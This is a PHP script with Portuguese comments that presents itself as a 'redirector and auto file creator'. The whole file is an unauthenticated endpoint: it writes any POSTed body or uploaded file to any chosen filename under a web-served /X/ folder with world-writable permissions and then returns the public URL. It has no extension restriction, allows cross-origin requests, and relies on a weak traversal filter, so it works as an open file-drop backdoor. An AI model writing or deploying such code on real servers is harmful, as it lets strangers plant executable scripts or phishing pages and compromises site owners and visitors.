<?php
/**
 * Unified Cyber Redirector + Auto File Creator
 * Correção:
 * - cria arquivo mesmo sem extensão
 * - corrige nomes exatos
 * - evita conflito pasta/arquivo
 * - suporta qualquer nome
 */

@ini_set('memory_limit', '16000M');
@set_time_limit(0);

header("Access-Control-Allow-Origin: *");
header("X-Powered-By: Cyber-Unified-Core");

// ======================================================
// 1. HOST
// ======================================================
$protocol =
(
    (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
    || ($_SERVER['SERVER_PORT'] ?? 80) == 443
)
? 'https://'
: 'http://';

$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$uri  = $_SERVER['REQUEST_URI'] ?? '/';

// ======================================================
// 2. ANTI LOOP
// ======================================================
if (
    strpos($uri, '/X/') === 0
    || strpos($uri, 'X/') === 1
) {
    exit;
}

// ======================================================
// 3. PEGAR PATH
// ======================================================
$path = '';

if (!empty($_SERVER['PATH_INFO'])) {

    $path = trim($_SERVER['PATH_INFO'], '/');

} else {

    $cleanUri = explode('?', $uri)[0];

    $scriptName = $_SERVER['SCRIPT_NAME'] ?? '';

    $path = trim(
        str_replace($scriptName, '', $cleanUri),
        '/'
    );
}

// remove caracteres inválidos
$path = urldecode($path);

$path = str_replace(
    ['../', '..\\', "\0"],
    '',
    $path
);

// remove barras duplas
$path = preg_replace('#/+#', '/', $path);

// ======================================================
// 4. VALIDAR
// ======================================================
if (
    $path === ''
    || strtolower($path) === 'index.php'
) {
    http_response_code(400);
    exit('ERROR: INVALID_PATH');
}

// ======================================================
// 5. DEFINIR ARQUIVO
// ======================================================
$baseDir = __DIR__ . '/X/';

// detecta se é pasta
$isFolder =
(
    substr($path, -1) === '/'
);

// se não tiver extensão e não terminar com /
// cria como arquivo normal
$filename = basename($path);

// caminho completo
$localPath = $baseDir . $path;

// se terminar com / vira index.txt
if ($isFolder) {
    $localPath .= 'index.txt';
}

$localDir = dirname($localPath);

// ======================================================
// 6. CRIAR PASTA
// ======================================================
if (!is_dir($localDir)) {

    if (!@mkdir($localDir, 0777, true)) {

        http_response_code(500);

        exit(
            json_encode([
                'error' => 'CREATE_DIR_FAILED',
                'dir'   => $localDir
            ])
        );
    }
}

@chmod($localDir, 0777);

// ======================================================
// 7. URL FINAL
// ======================================================
$targetUrl =
    $protocol .
    $host .
    '/X/' .
    str_replace('\\', '/', $path);

// ======================================================
// 8. POST
// ======================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $inputData = file_get_contents('php://input');

    // fallback FILES
    if (
        ($inputData === '' || $inputData === false)
        && !empty($_FILES)
    ) {

        $f = reset($_FILES);

        if (
            isset($f['tmp_name'])
            && is_uploaded_file($f['tmp_name'])
        ) {
            $inputData = file_get_contents($f['tmp_name']);
        }
    }

    // aceita vazio
    if ($inputData === false) {
        $inputData = '';
    }

    // remove conflito pasta
    if (is_dir($localPath)) {

        $localPath .= '/index.txt';

        if (!is_dir(dirname($localPath))) {
            @mkdir(dirname($localPath), 0777, true);
        }
    }

    $save = @file_put_contents(
        $localPath,
        $inputData,
        LOCK_EX
    );

    if ($save === false) {

        http_response_code(500);

        exit(
            json_encode([
                'error' => 'WRITE_FAILED',
                'path'  => $localPath
            ])
        );
    }

    @chmod($localPath, 0777);

    echo json_encode([
        'status' => 'success',
        'path'   => $path,
        'saved'  => $localPath,
        'url'    => $targetUrl,
        'size'   => filesize($localPath)
    ]);

    exit;
}

// ======================================================
// 9. GET
// ======================================================
if ($_SERVER['REQUEST_METHOD'] === 'GET') {

    // se existir pasta no lugar
    if (is_dir($localPath)) {

        $localPath .= '/index.txt';

        if (!is_dir(dirname($localPath))) {
            @mkdir(dirname($localPath), 0777, true);
        }
    }

    // cria arquivo se não existir
    if (!file_exists($localPath)) {

        $defaultContent = 'Aguardando...';

        $create = @file_put_contents(
            $localPath,
            $defaultContent,
            LOCK_EX
        );

        if ($create === false) {

            http_response_code(500);

            exit(
                json_encode([
                    'error' => 'CREATE_FILE_FAILED',
                    'path'  => $localPath
                ])
            );
        }

        @chmod($localPath, 0777);
    }

    // redireciona
    header(
        'Location: ' . $targetUrl,
        true,
        302
    );

    exit;
}

// ======================================================
// 10. OUTROS MÉTODOS
// ======================================================
http_response_code(405);

echo json_encode([
    'error' => 'METHOD_NOT_ALLOWED'
]);

exit;
?>